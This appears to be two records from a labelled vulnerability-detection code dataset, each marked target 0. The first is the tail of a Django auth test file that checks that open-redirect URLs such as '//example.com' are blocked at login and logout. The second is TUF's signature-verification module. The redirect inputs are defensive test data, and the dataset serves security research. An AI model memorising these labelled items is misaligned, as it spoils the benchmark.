else:\n            self.assertIsInstance(response.context['site'], RequestSite)\n        self.assertTrue(isinstance(response.context['form'], AuthenticationForm),\n                     'Login form is not an AuthenticationForm')\n\n    def test_security_check(self, password='password'):\n        login_url = reverse('django.contrib.auth.views.login')\n\n        # Those URLs should not pass the security check\n        for bad_url in ('http://example.com',\n                        'https://example.com',\n                        'ftp://exampel.com',\n                        '//example.com'):\n\n            nasty_url = '%(url)s?%(next)s=%(bad_url)s' % {\n                'url': login_url,\n                'next': REDIRECT_FIELD_NAME,\n                'bad_url': urlquote(bad_url),\n            }\n            response = self.client.post(nasty_url, {\n                'username': 'testclient',\n                'password': password,\n            })\n            self.assertEqual(response.status_code, 302)\n            self.assertFalse(bad_url in response['Location'],\n                             \"%s should be blocked\" % bad_url)\n\n        # These URLs *should* still pass the security check\n        for good_url in ('/view/?param=http://example.com',\n                         '/view/?param=https://example.com',\n                         '/view?param=ftp://exampel.com',\n                         'view/?param=//example.com',\n                         'https:///',\n                         '//testserver/',\n                         '/url%20with%20spaces/'):  # see ticket #12534\n            safe_url = '%(url)s?%(next)s=%(good_url)s' % {\n                'url': login_url,\n                'next': REDIRECT_FIELD_NAME,\n                'good_url': urlquote(good_url),\n            }\n            response = self.client.post(safe_url, {\n                    'username': 'testclient',\n                    'password': password,\n            })\n            self.assertEqual(response.status_code, 302)\n            self.assertTrue(good_url in response['Location'],\n                            \"%s should be allowed\" % good_url)\n\n\n@skipIfCustomUser\nclass LoginURLSettings(AuthViewsTestCase):\n\n    def setUp(self):\n        super(LoginURLSettings, self).setUp()\n        self.old_LOGIN_URL = settings.LOGIN_URL\n\n    def tearDown(self):\n        super(LoginURLSettings, self).tearDown()\n        settings.LOGIN_URL = self.old_LOGIN_URL\n\n    def get_login_required_url(self, login_url):\n        settings.LOGIN_URL = login_url\n        response = self.client.get('/login_required/')\n        self.assertEqual(response.status_code, 302)\n        return response['Location']\n\n    def test_standard_login_url(self):\n        login_url = '/login/'\n        login_required_url = self.get_login_required_url(login_url)\n        querystring = QueryDict('', mutable=True)\n        querystring['next'] = '/login_required/'\n        self.assertEqual(login_required_url, 'http://testserver%s?%s' %\n                         (login_url, querystring.urlencode('/')))\n\n    def test_remote_login_url(self):\n        login_url = 'http://remote.example.com/login'\n        login_required_url = self.get_login_required_url(login_url)\n        querystring = QueryDict('', mutable=True)\n        querystring['next'] = 'http://testserver/login_required/'\n        self.assertEqual(login_required_url,\n                         '%s?%s' % (login_url, querystring.urlencode('/')))\n\n    def test_https_login_url(self):\n        login_url = 'https:///login/'\n        login_required_url = self.get_login_required_url(login_url)\n        querystring = QueryDict('', mutable=True)\n        querystring['next'] = 'http://testserver/login_required/'\n        self.assertEqual(login_required_url,\n                         '%s?%s' % (login_url, querystring.urlencode('/')))\n\n    def test_login_url_with_querystring(self):\n        login_url = '/login/?pretty=1'\n        login_required_url = self.get_login_required_url(login_url)\n        querystring = QueryDict('pretty=1', mutable=True)\n        querystring['next'] = '/login_required/'\n        self.assertEqual(login_required_url, 'http://testserver/login/?%s' %\n                         querystring.urlencode('/'))\n\n    def test_remote_login_url_with_next_querystring(self):\n        login_url = 'http://remote.example.com/login/'\n        login_required_url = self.get_login_required_url('%s?next=/default/' %\n                                                         login_url)\n        querystring = QueryDict('', mutable=True)\n        querystring['next'] = 'http://testserver/login_required/'\n        self.assertEqual(login_required_url, '%s?%s' % (login_url,\n                                                    querystring.urlencode('/')))\n\n\n@skipIfCustomUser\nclass LogoutTest(AuthViewsTestCase):\n\n    def confirm_logged_out(self):\n        self.assertTrue(SESSION_KEY not in self.client.session)\n\n    def test_logout_default(self):\n        \"Logout without next_page option renders the default template\"\n        self.login()\n        response = self.client.get('/logout/')\n        self.assertContains(response, 'Logged out')\n        self.confirm_logged_out()\n\n    def test_14377(self):\n        # Bug 14377\n        self.login()\n        response = self.client.get('/logout/')\n        self.assertTrue('site' in response.context)\n\n    def test_logout_with_overridden_redirect_url(self):\n        # Bug 11223\n        self.login()\n        response = self.client.get('/logout/next_page/')\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/somewhere/'))\n\n        response = self.client.get('/logout/next_page/?next=/login/')\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/login/'))\n\n        self.confirm_logged_out()\n\n    def test_logout_with_next_page_specified(self):\n        \"Logout with next_page option given redirects to specified resource\"\n        self.login()\n        response = self.client.get('/logout/next_page/')\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/somewhere/'))\n        self.confirm_logged_out()\n\n    def test_logout_with_redirect_argument(self):\n        \"Logout with query string redirects to specified resource\"\n        self.login()\n        response = self.client.get('/logout/?next=/login/')\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/login/'))\n        self.confirm_logged_out()\n\n    def test_logout_with_custom_redirect_argument(self):\n        \"Logout with custom query string redirects to specified resource\"\n        self.login()\n        response = self.client.get('/logout/custom_query/?follow=/somewhere/')\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/somewhere/'))\n        self.confirm_logged_out()\n\n    def test_security_check(self, password='password'):\n        logout_url = reverse('django.contrib.auth.views.logout')\n\n        # Those URLs should not pass the security check\n        for bad_url in ('http://example.com',\n                        'https://example.com',\n                        'ftp://exampel.com',\n                        '//example.com'):\n            nasty_url = '%(url)s?%(next)s=%(bad_url)s' % {\n                'url': logout_url,\n                'next': REDIRECT_FIELD_NAME,\n                'bad_url': urlquote(bad_url),\n            }\n            self.login()\n            response = self.client.get(nasty_url)\n            self.assertEqual(response.status_code, 302)\n            self.assertFalse(bad_url in response['Location'],\n                             \"%s should be blocked\" % bad_url)\n            self.confirm_logged_out()\n\n        # These URLs *should* still pass the security check\n        for good_url in ('/view/?param=http://example.com',\n                         '/view/?param=https://example.com',\n                         '/view?param=ftp://exampel.com',\n                         'view/?param=//example.com',\n                         'https:///',\n                         '//testserver/',\n                         '/url%20with%20spaces/'):  # see ticket #12534\n            safe_url = '%(url)s?%(next)s=%(good_url)s' % {\n                'url': logout_url,\n                'next': REDIRECT_FIELD_NAME,\n                'good_url': urlquote(good_url),\n            }\n            self.login()\n            response = self.client.get(safe_url)\n            self.assertEqual(response.status_code, 302)\n            self.assertTrue(good_url in response['Location'],\n                            \"%s should be allowed\" % good_url)\n            self.confirm_logged_out()\n", "target": 0}
{"idx": 1077, "func": "#!/usr/bin/env python\n\n# Copyright 2012 - 2017, New York University and the TUF contributors\n# SPDX-License-Identifier: MIT OR Apache-2.0\n\n\"\"\"\n<Program Name>\n  sig.py\n\n<Author>\n  Vladimir Diaz <vladimir.v.diaz@gmail.com>\n\n<Started>\n  February 28, 2012.   Based on a previous version by Geremy Condra.\n\n<Copyright>\n  See LICENSE-MIT OR LICENSE for licensing information.\n\n<Purpose>\n  Survivable key compromise is one feature of a secure update system\n  incorporated into TUF's design. Responsibility separation through\n  the use of multiple roles, multi-signature trust, and explicit and\n  implicit key revocation are some of the mechanisms employed towards\n  this goal of survivability.  These mechanisms can all be seen in\n  play by the functions available in this module.\n\n  The signed metadata files utilized by TUF to download target files\n  securely are used and represented here as the 'signable' object.\n  More precisely, the signature structures contained within these metadata\n  files are packaged into 'signable' dictionaries.  This module makes it\n  possible to capture the states of these signatures by organizing the\n  keys into different categories.  As keys are added and removed, the\n  system must securely and efficiently verify the status of these signatures.\n  For instance, a bunch of keys have recently expired. How many valid keys\n  are now available to the Snapshot role?  This question can be answered by\n  get_signature_status(), which will return a full 'status report' of these\n  'signable' dicts.  This module also provides a convenient verify() function\n  that will determine if a role still has a sufficient number of valid keys.\n  If a caller needs to update the signatures of a 'signable' object, there\n  is also a function for that.\n\"\"\"\n\n# Help with Python 3 compatibility, where the print statement is a function, an\n# implicit relative import is invalid, and the '/' operator performs true\n# division.  Example:  print 'hello world' raises a 'SyntaxError' exception.\nfrom __future__ import print_function\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import unicode_literals\n\nimport logging\n\nimport tuf\nimport tuf.keydb\nimport tuf.roledb\nimport tuf.formats\n\nimport securesystemslib\n\n# See 'log.py' to learn how logging is handled in TUF.\nlogger = logging.getLogger('tuf.sig')\n\n# Disable 'iso8601' logger messages to prevent 'iso8601' from clogging the\n# log file.\niso8601_logger = logging.getLogger('iso8601')\niso8601_logger.disabled = True\n\n\ndef get_signature_status(signable, role=None, repository_name='default',\n    threshold=None, keyids=None):\n  \"\"\"\n  <Purpose>\n    Return a dictionary representing the status of the signatures listed in\n    'signable'. Signatures in the returned dictionary are identified by the\n    signature keyid and can have a status of either:\n\n    * bad -- Invalid signature\n    * good -- Valid signature from key that is available in 'tuf.keydb', and is\n      authorized for the passed role as per 'tuf.roledb' (authorization may be\n      overwritten by passed 'keyids').\n    * unknown -- Signature from key that is not available in 'tuf.keydb', or if\n      'role' is None.\n    * unknown signing schemes -- Signature from key with unknown signing\n      scheme.\n    * untrusted -- Valid signature from key that is available in 'tuf.keydb',\n      but is not trusted for the passed role as per 'tuf.roledb' or the passed\n      'keyids'.\n\n    NOTE: The result may contain duplicate keyids or keyids that reference the\n    same key, if 'signable' lists multiple signatures from the same key.\n\n  <Arguments>\n    signable:\n      A dictionary containing a list of signatures and a 'signed' identifier.\n      signable = {'signed': 'signer',\n                  'signatures': [{'keyid': keyid,\n                                  'sig': sig}]}\n\n      Conformant to tuf.formats.SIGNABLE_SCHEMA.\n\n    role:\n      TUF role string (e.g. 'root', 'targets', 'snapshot' or timestamp).\n\n    threshold:\n      Rather than reference the role's threshold as set in tuf.roledb.py, use\n      the given 'threshold' to calculate the signature status of 'signable'.\n      'threshold' is an integer value that sets the role's threshold value, or\n      the minimum number of signatures needed for metadata to be considered\n      fully signed.\n\n    keyids:\n      Similar to the 'threshold' argument, use the supplied list of 'keyids'\n      to calculate the signature status, instead of referencing the keyids\n      in tuf.roledb.py for 'role'.\n\n  <Exceptions>\n    securesystemslib.exceptions.FormatError, if 'signable' does not have the\n    correct format.\n\n    tuf.exceptions.UnknownRoleError, if 'role' is not recognized.\n\n  <Side Effects>\n    None.\n\n  <Returns>\n    A dictionary representing the status of the signatures in 'signable'.\n    Conformant to tuf.formats.SIGNATURESTATUS_SCHEMA.\n  \"\"\"\n\n  # Do the arguments have the correct format?  This check will ensure that\n  # arguments have the appropriate number of objects and object types, and that\n  # all dict keys are properly named.  Raise\n  # 'securesystemslib.exceptions.FormatError' if the check fails.\n  tuf.formats.SIGNABLE_SCHEMA.check_match(signable)\n  securesystemslib.formats.NAME_SCHEMA.check_match(repository_name)\n\n  if role is not None:\n    tuf.formats.ROLENAME_SCHEMA.check_match(role)\n\n  if threshold is not None:\n    tuf.formats.THRESHOLD_SCHEMA.check_match(threshold)\n\n  if keyids is not None:\n    securesystemslib.formats.KEYIDS_SCHEMA.check_match(keyids)\n\n  # The signature status dictionary returned.\n  signature_status = {}\n  good_sigs = []\n  bad_sigs = []\n  unknown_sigs = []\n  untrusted_sigs = []\n  unknown_signing_schemes = []\n\n  # Extract the relevant fields from 'signable' that will allow us to identify\n  # the different classes of keys (i.e., good_sigs, bad_sigs, etc.).\n  signed = securesystemslib.formats.encode_canonical(signable['signed']).encode('utf-8')\n  signatures = signable['signatures']\n\n  # Iterate the signatures and enumerate the signature_status fields.\n  # (i.e., good_sigs, bad_sigs, etc.).\n  for signature in signatures:\n    keyid = signature['keyid']\n\n    # Does the signature use an unrecognized key?\n    try:\n      key = tuf.keydb.get_key(keyid, repository_name)\n\n    except tuf.exceptions.UnknownKeyError:\n      unknown_sigs.append(keyid)\n      continue\n\n    # Does the signature use an unknown/unsupported signing scheme?\n    try:\n      valid_sig = securesystemslib.keys.verify_signature(key, signature, signed)\n\n    except securesystemslib.exceptions.UnsupportedAlgorithmError:\n      unknown_signing_schemes.append(keyid)\n      continue\n\n    # We are now dealing with either a trusted or untrusted key...\n    if valid_sig:\n      if role is not None:\n\n        # Is this an unauthorized key? (a keyid associated with 'role')\n        # Note that if the role is not known, tuf.exceptions.UnknownRoleError\n        # is raised here.\n        if keyids is None:\n          keyids = tuf.roledb.get_role_keyids(role, repository_name)\n\n        if keyid not in keyids:\n          untrusted_sigs.append(keyid)\n          continue\n\n      # This is an unset role, thus an unknown signature.\n      else:\n        unknown_sigs.append(keyid)\n        continue\n\n      # Identify good/authorized key.\n      good_sigs.append(keyid)\n\n    else:\n      # This is a bad signature for a trusted key.\n      bad_sigs.append(keyid)\n\n  # Retrieve the threshold value for 'role'.  Raise\n  # tuf.exceptions.UnknownRoleError if we were given an invalid role.\n  if role is not None:\n    if threshold is None:\n      # Note that if the role is not known, tuf.exceptions.UnknownRoleError is\n      # raised here.\n      threshold = tuf.roledb.get_role_threshold(\n          role, repository_name=repository_name)\n\n    else:\n      logger.debug('Not using roledb.py\\'s threshold for ' + repr(role))\n\n  else:\n    threshold = 0\n\n  # Build the signature_status dict.\n  signature_status['threshold'] = threshold\n  signature_status['good_sigs'] = good_sigs\n  signature_status['bad_sigs'] = bad_sigs\n  signature_status['unknown_sigs'] = unknown_sigs\n  signature_status['untrusted_sigs'] = untrusted_sigs\n  signature_status['unknown_signing_schemes'] = unknown_signing_schemes\n\n  return signature_status\n\n\n\n\n\ndef verify(signable, role, repository_name='default', threshold=None,\n    keyids=None):\n  \"\"\"\n  <Purpose>\n    Verify that 'signable' has a valid threshold of authorized signatures\n    identified by unique keyids. The threshold and whether a keyid is\n    authorized is determined by querying the 'threshold' and 'keyids' info for\n    the passed 'role' in 'tuf.roledb'. Both values can be overwritten by\n    passing the 'threshold' or 'keyids' arguments.\n\n    NOTE:\n    - Signatures with identical authorized keyids only count towards the\n      threshold once.\n    - Signatures with different authorized keyids each count towards the\n      threshold, even if the keyids identify the same key.\n\n  <Arguments>\n    signable:\n      A dictionary containing a list of signatures and a 'signed' identifier\n      that conforms to SIGNABLE_SCHEMA, e.g.:\n      signable = {'signed':, 'signatures': [{'keyid':, 'method':, 'sig':}]}\n\n    role:\n      TUF role string (e.g. 'root', 'targets', 'snapshot' or timestamp).\n\n    threshold:\n      Rather than reference the role's threshold as set in tuf.roledb.py, use\n      the given 'threshold' to calculate the signature status of 'signable'.\n      'threshold' is an integer value that sets the role's threshold value, or\n      the minimum number of signatures needed for metadata to be considered\n      fully signed.\n\n    keyids:\n      Similar to the 'threshold' argument, use the supplied list of 'keyids'\n      to calculate the signature status, instead of referencing the keyids\n      in tuf.roledb.py for 'role'.\n\n  <Exceptions>\n    tuf.exceptions.UnknownRoleError, if 'role' is not recognized.\n\n    securesystemslib.exceptions.FormatError, if 'signable' is not formatted\n    correctly.\n\n    securesystemslib.exceptions.Error, if an invalid threshold is encountered.\n\n  <Side Effects>\n    tuf.sig.get_signature_status() called.  Any exceptions thrown by\n    get_signature_status() will be caught here and re-raised.\n\n  <Returns>\n    Boolean.  True if the number of good unique (by keyid) signatures >= the\n    role's threshold, False otherwise.\n  \"\"\"\n\n  tuf.formats.SIGNABLE_SCHEMA.check_match(signable)\n  tuf.formats.ROLENAME_SCHEMA.check_match(role)\n  securesystemslib.formats.NAME_SCHEMA.check_match(repository_name)\n\n  # Retrieve the signature status.  tuf.sig.get_signature_status() raises:\n  # tuf.exceptions.UnknownRoleError\n  # securesystemslib.exceptions.FormatError.  'threshold' and 'keyids' are also\n  # validated.\n  status = get_signature_status(signable, role, repository_name, threshold, keyids)\n\n  # Retrieve the role's threshold and the authorized keys of 'status'\n  threshold = status['threshold']\n  good_sigs = status['good_sigs']\n\n  # Does 'status' have the required threshold of signatures?\n  # First check for invalid threshold values before returning result.\n  # Note: get_signature_status() is expected to verify that 'threshold' is\n  # not None or <= 0.\n  if threshold is None or threshold <= 0: #pragma: no cover\n    raise securesystemslib.exceptions.Error(\"Invalid threshold: \" + repr(threshold))\n\n  return len(set(good_sigs)) >= threshold\n\n\n\n\n\ndef may_need_new_keys(signature_status):\n  \"\"\"\n  <Purpose>\n    Return true iff downloading a new set of keys might tip this\n    signature status over to valid.  This is determined by checking\n    if either the number of unknown or untrusted keys is > 0.\n\n  <Arguments>\n    signature_status:\n      The dictionary returned by tuf.sig.get_signature_status().\n\n  <Exceptions>\n    securesystemslib.exceptions.FormatError, if 'signature_status does not have\n    the correct format.\n\n  <Side Effects>\n    None.\n\n  <Returns>\n    Boolean.\n  \"\"\"\n\n  # Does 'signature_status' have the correct format?\n  # This check will ensure 'signature_status' has the appropriate number\n  # of objects and object types, and that all dict keys are properly named.\n  # Raise 'securesystemslib.exceptions.FormatError' if the check fails.\n  tuf.formats.SIGNATURESTATUS_SCHEMA.check_match(signature_status)\n\n  unknown = signature_status['unknown_sigs']\n  untrusted = signature_status['untrusted_sigs']\n\n  return len(unknown) or len(untrusted)\n\n\n\n\n\ndef generate_rsa_signature(signed, rsakey_dict):\n  \"\"\"\n  <Purpose>\n    Generate a new signature dict presumably to be added to the 'signatures'\n    field of 'signable'.  The 'signable' dict is of the form:\n\n    {'signed': 'signer',\n               'signatures': [{'keyid': keyid,\n                               'method': 'evp',\n                               'sig': sig}]}\n\n    The 'signed' argument is needed here for the signing process.\n    The 'rsakey_dict' argument is used to generate 'keyid', 'method', and 'sig'.\n\n    The caller should ensure the returned signature is not already in\n    'signable'.\n\n  <Arguments>\n    signed:\n      The data used by 'securesystemslib.keys.create_signature()' to generate\n      signatures.  It is stored in the 'signed' field of 'signable'.\n\n    rsakey_dict:\n      The RSA key, a 'securesystemslib.formats.RSAKEY_SCHEMA' dictionary.\n      Used here to produce 'keyid', 'method', and 'sig'.\n\n  <Exceptions>\n    securesystemslib.exceptions.FormatError, if 'rsakey_dict' does not have the\n    correct format.\n\n    TypeError, if a private key is not defined for 'rsakey_dict'.\n\n  <Side Effects>\n    None.\n\n  <Returns>\n    Signature dictionary conformant to securesystemslib.formats.SIGNATURE_SCHEMA.\n    Has the form:\n    {'keyid': keyid, 'method': 'evp', 'sig': sig}\n  \"\"\"\n\n  # We need 'signed' in canonical JSON format to generate\n  # the 'method' and 'sig' fields of the signature.\n  signed = securesystemslib.formats.encode_canonical(signed).encode('utf-8')\n\n  # Generate the RSA signature.\n  # Raises securesystemslib.exceptions.FormatError and TypeError.\n  signature = securesystemslib.keys.create_signature(rsakey_dict, signed)\n\n  return signature\n", "target": 0}
